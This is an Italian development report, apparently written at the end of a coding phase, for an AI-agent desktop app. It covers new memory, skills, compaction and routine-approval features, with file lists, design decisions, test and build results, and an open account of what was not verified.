3. **Routine creata dall'agente:** "crea una routine 'Riepilogo mattina' con schedule 0 9 * * 1-5 (Europe/Rome)…" → `update_state create` senza approval → tabella routines: `enabled=0, provenance='agent', timezone='Europe/Rome'` → evento in chat "Routine creata (in pausa): Riepilogo mattina" (visibile, non dietro il toggle).
4. **Attivazione → card:** "attiva la routine" → `paused-for-approval` + card "update_state: attivare la routine \"Riepilogo mattina\" — nei giorni feriali alle 09:00 — prompt: …" → allow → `enabled=1` + evento "Routine attivata: Riepilogo mattina".
5. Pulizia: routine ri-messa in pausa, modello ripristinato, app e daemon chiusi (daemon.json rimosso correttamente). Nel DB di sviluppo restano le entry della verifica (147–205), la memoria "Nome: Fabio. Preferenza linguistica: italiana." (corretta e voluta) e la routine "Riepilogo mattina" in pausa.

## REPORT FASE 4

- **File modificati/creati:**
  - `src/main/agent/memory.ts` — **nuovo** — memoria a file: frontmatter, scope agent/user, selezione budget (core sempre, log recenti), ricerca per parole chiave, id runtime-only (no traversal).
  - `src/main/agent/skills.ts` — **nuovo** — SKILL.md in formato Claude Code, nome validato prima dei path, sezione prompt con soli nome+descrizione.
  - `src/main/agent/compaction.ts` — **nuovo** — piano puro (soglia 70%, confini di turno, minimo necessario), digest, orchestrazione con LLM iniettabile e fallback silenzioso.
  - `src/main/agent/update-state.ts` — **nuovo** — verdetto puro di update_state (resume/update-attiva = ask) + testo degli eventi automation.
  - `src/shared/cron-human.ts` — **nuovo** — describeCron: schedule in linguaggio naturale per la card (forme comuni, ripiego sull'espressione).
  - `src/main/agent/tools.ts` — tool defs + esecuzione di update_memory/recall_memory/skill/update_skill/update_state (routine con parseCron, create in pausa provenance agent, meta.automation).
  - `src/main/agent/permissions.ts` + `permission-rules.ts` — short-circuit always_allow per memoria/lettura skill; verdetto update_state con standing grant per routine; targetKey `skill <nome>` / `routine <id>`.
  - `src/main/agent/loop.ts` — compaction pre-buildMessages, system prompt con sezioni Memoria/Skill, evento automation dopo l'esecuzione, residuo 0c (interrupt → approval 'cancelled').
  - `src/main/agent/history.ts` — il summary sostituisce i turni coperti (`coversUpTo`), entra come messaggio utente di contesto.
  - `src/main/agent/prompts.ts` — regole "Memoria, skill e routine" nel system; `secondaryPrompts.compaction`.
  - `src/main/store/db.ts` — colonne routine description/timezone/provenance (+ALTER per DB esistenti), `getRoutine`, `createRoutine` con opts, regole di default dei nuovi tool.
  - `src/main/daemon-client.ts`, `src/renderer/src/store.ts`, `src/shared/types.ts` — residuo 0b: evento 'reconnected' alla riconnessione → la UI ricarica agenti ed entry.
  - `src/daemon/api.ts`, `src/main/ipc.ts`, `src/preload/index.ts` — RPC memory:list/update/delete, skills:list/delete.
  - `src/renderer/src/components/MemoryPanel.tsx`, `SkillsPanel.tsx` — **nuovi** — sezioni della vista agente (elenco, modifica/eliminazione memorie; istruzioni/eliminazione skill).
  - `src/renderer/src/components/Chat.tsx` — bottoni 🗂/🛠, rendering entry summary (solo col toggle ragionamento).
  - `src/renderer/src/components/ApprovalCard.tsx` — card dedicata update_state (nome, schedule naturale, prompt) + label 'cancelled'.
  - test: **nuovi** `memory.test.ts`, `skills.test.ts`, `compaction.test.ts`, `update-state.test.ts`, `cron-human.test.ts`, `daemon-client.test.ts`; estesi `loop.test.ts` (mock db con routine/dataDir, risposta-funzione con messages/tools), `permissions.test.ts`, `external-send.test.ts`.
- **Decisioni prese e perché:** (1) update_memory/recall_memory/skill sono consentiti con uno short-circuit nel gate PRIMA delle regole utente (oltre alle regole di default): la specifica li vuole always_allow e i file sono solo dell'agente — così una config utente salvata nelle fasi 1-3 non può degradarli a ask; una regola `blocked` invece vince su update_state/update_skill ma NON sui tool di memoria/lettura skill (scelta coerente con i tre tool di comunicazione di fase 3, che il gate non può bloccare); (2) il verdetto di update_state è una funzione pura che riceve la routine corrente: così i test non dipendono dallo store e il gate resta sottile; "Consenti sempre" su un resume salva una grant `routine <id>` (per routine, non per tool); (3) il confine di compaction è "prima di un messaggio utente" e il suffix contiene SEMPRE il turno corrente: il prefix riassunto è fatto di turni completi, quindi nessuna coppia tool spezzata in ciò che resta al modello; se nemmeno riassumendo tutto il passato si scende sotto soglia, si compatta solo se il prefix ha massa sufficiente (≥256 token stimati) perché il riepilogo porti un risparmio reale; (4) `timezone` delle routine viene accettata e persistita ma l'esecuzione resta nel fuso locale (nextCronRun non è tz-aware): dichiarato nei limiti, preferito al silenzio; (5) gli eventi automation sono entry `event` visibili in chat (non dietro il toggle) come nell'originale "automation-changed"; (6) il riavvio di routine poteva essere fatto anche ri-usando `routines:update` della UI, ma il click sulla card passa dallo stesso gate: la card è l'unico punto in cui "Consenti sempre" ha senso; (7) per 0b il client del daemon espone fabbrica ws + ensure iniettabili: il test simula connessione→caduta→riconnessione senza socket reali.
- **Deviazioni dalla specifica e perché:** (1) `describeCron` (schedule in linguaggio naturale) copre le forme cron comuni e ripiega sull'espressione grezza per i casi irregolari — un descrittore cron completo sarebbe fuori misura per una card; (2) il pannello Memoria modifica solo il contenuto (tier/scope restano quelli scelti dal bot o dall'utente via file): la specifica chiede "modifica ed eliminazione" senza dettagli; (3) come da convenzione, i residui sono in un commit separato (`fase 4: residui`, `6a1a913`).
- **Output di typecheck / vitest / build (ultime righe):** `tsc --noEmit` pulito (exit 0); vitest `Test Files 28 passed (28)` / `Tests 315 passed (315)`; build `✓ built` ×3 — `out/main/index.js 18.94 kB`, `out/main/daemon.js 160.84 kB`, preload `3.47 kB`, renderer `1.208,46 kB`.
- **Cosa NON è stato verificato:** (1) il rendering visivo dei pannelli Memoria/Skill e della card update_state NON è stato ispezionato a schermo: i dati che li alimentano (memory:list, skills:list, entry approval con input) sono stati verificati via RPC dal vivo e dai test, e il click sui bottoni DOM di Electron era già noto inaffidabile da computer use (fase 3); (2) la compaction non è stata osservata dal vivo (servirebbero decine di turni oltre soglia sul DB reale): coperta da test con store reale e LLM finto, incluso il wiring nel loop; (3) il percorso impacchettato dist/dmg (invariato rispetto alle fasi precedenti); (4) update_skill dal vivo (nessuna skill generata nella sessione: verificato da test con gate finto/vero e file reali).
- **Problemi fuori scope notati:** (1) `agents:delete` non rimuove le directory `agents/<id>/` (memoria e skill restano su disco: orfane, nessun rischio di leak verso altri agenti perché i path restano per id); (2) se un riassunto esiste già, un crash tra summary e modello può produrre un secondo summary ridondante al retry (il vecchio viene sostituito comunque in buildMessages: solo una chiamata LLM in più); (3) `applyDraftBody` scrive il body come stringa anche se l'argomento via.args era un array (stessa classe del residuo 0a, ma tocca la modifica manuale della bozza, non richiesta dalla specifica); (4) glm-5.3-flash su Ollama annida le tool call nel testo di send_to_user (qualità del modello, nessun intervento qui); (5) il ws-server resta mono-client: i probe di verifica calciano la finestra, che ora però si riprende da sola grazie al residuo 0b; (6) node-cron inutilizzato e avvisi rollup (invariati).
